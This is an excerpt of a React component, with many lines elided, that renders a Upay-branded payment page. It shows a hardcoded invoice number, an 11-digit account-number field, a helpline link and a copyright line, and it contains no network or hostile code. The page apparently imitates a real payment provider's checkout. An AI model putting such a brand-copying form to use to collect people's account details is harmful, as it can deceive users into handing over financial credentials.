    ...
    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: "#e8ebef" }}>
      <div className="w-full max-w-sm bg-white rounded-xl shadow-lg overflow-hidden">
        ...
        <div className="bg-white p-4 border-b border-gray-200">
          <img src={upayLogo} alt="Upay" className="h-8 mx-auto" />
        </div>
        ...
        <div className="bg-white p-4 border-b border-gray-200 flex items-center justify-between">
          <div className="flex items-center gap-3">
            ...
            <div>
              ...
              <div className="text-xs text-gray-500">Inv No: UPY457BD374N9</div>
            </div>
          </div>
        ...
        {/* Yellow Section */}
        <div className="p-6" style={{ backgroundColor: "#FFD700" }}>
          <div className="text-center mb-6">
            ...
            <input
              ...
              maxLength={11}
              className="w-full px-4 py-3 rounded text-center text-gray-800 text-lg font-medium placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-gray-900"
            />
          </div>
          ...
          <button
            ...
            style={
              accountNumber.length === 11 && !loading
                ? { backgroundColor: "#FFD700", color: "#000", borderColor: "#FFD700", cursor: "pointer" }
                : {}
            }
          >
        ...
        <div className="bg-white px-4 pb-4 text-center">
          <div className="flex items-center justify-center gap-1 text-xs text-gray-600 mb-2">
            ...
            <a href="tel:16268" className="font-semibold text-yellow-600 hover:underline">16268</a>
          </div>
          <div className="text-xs text-gray-500">© 2023 Upay, All Rights Reserved</div>
        </div>
      </div>
